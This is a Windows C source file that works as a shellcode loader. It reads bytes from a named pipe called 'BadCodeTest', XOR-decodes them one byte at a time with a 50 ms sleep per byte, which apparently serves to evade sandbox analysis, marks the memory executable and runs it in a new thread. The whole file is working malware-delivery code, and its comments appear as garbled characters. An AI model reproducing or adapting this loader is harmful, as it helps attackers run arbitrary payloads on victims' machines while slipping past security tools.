#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#define BUFF_SIZE 1024

PTCHAR ptsPipeName = TEXT("\\\\.\\pipe\\BadCodeTest");

int wmain(int argc, TCHAR * argv[]){

	HANDLE hPipe;
	DWORD dwError;
	CHAR szBuffer[BUFF_SIZE];
	DWORD dwLen;
	PCHAR pszShellcode = NULL;
	DWORD dwOldProtect; // �ڴ�ҳ����
	HANDLE hThread;
	DWORD dwThreadId;
	// �ο���https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
	hPipe = CreateNamedPipe(
		ptsPipeName,
		PIPE_ACCESS_INBOUND,
		PIPE_TYPE_BYTE| PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		BUFF_SIZE,
		BUFF_SIZE,
		0,
		NULL);

	if(hPipe == INVALID_HANDLE_VALUE){
		dwError = GetLastError();
		printf("[-]Create Pipe Error : %d \n",dwError);
		return dwError;
	}

	if(ConnectNamedPipe(hPipe,NULL) > 0){
		printf("[+]Client Connected...\n");
		ReadFile(hPipe,szBuffer,BUFF_SIZE,&dwLen,NULL);
		printf("[+]Get DATA Length : %d \n",dwLen);
		// �����ڴ�ҳ
		pszShellcode = (PCHAR)VirtualAlloc(NULL,dwLen,MEM_COMMIT,PAGE_READWRITE);
		// �����ڴ�
		CopyMemory(pszShellcode,szBuffer,dwLen);

		for(DWORD i = 0;i< dwLen; i++){
			Sleep(50);
			_InterlockedXor8(pszShellcode+i,10);
		}

		// ���￪ʼ������������Ϊ��ִ��
		VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&dwOldProtect);
		// ִ��Shellcode
		hThread = CreateThread(
			NULL, // ��ȫ������
			NULL, // ջ�Ĵ�С
			(LPTHREAD_START_ROUTINE)pszShellcode, // ����
			NULL, // ����
			NULL, // �̱߳�־
			&dwThreadId // �߳�ID
		);

		WaitForSingleObject(hThread,INFINITE);
	}

	return 0;
}